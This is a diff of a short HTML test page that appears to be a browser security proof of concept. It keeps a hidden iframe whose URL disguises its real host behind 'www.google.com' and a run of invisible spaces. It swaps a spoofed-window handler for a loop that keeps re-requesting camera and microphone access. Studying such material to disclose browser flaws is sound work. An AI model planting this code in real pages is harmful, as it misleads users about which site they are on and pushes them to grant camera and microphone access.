@@ -8,15 +8,22 @@
 <iframe style="display:none" src="http://www.google.com　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　@l0.cm/fg.html"></iframe>
 
 <script>
-function a(){
-	window.open('http://www.google.com　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　@l0.cm/fg.html', 'x');
-	setTimeout(function(){
-		window.open('http://l0.cm/204', 'x');
-	}, 500);
-}
+var constraints = { video: true, audio: true };
+
+var gum = () => navigator.mediaDevices.getUserMedia(constraints)
+  .then(stream => video.srcObject = stream)
+  .then(() => new Promise(r => video.onloadedmetadata = r))
+  .then(() => waitUntil(() => video.paused))
+  .then(() => gum())
+  .catch(failed);
+
+gum();
+
+var waitUntil = f => new Promise(r => {
+  var iv = setInterval(() => f() && r(clearInterval(iv)), 200);
+});
+var log = msg => div.innerHTML += "<p>" + msg + "</p>";
+var failed = e => log(e +", line "+ e.lineNumber);
 </script>
-
-<a href="#" onclick="a(); return false;">go</a>
-
 </body>
 </html>
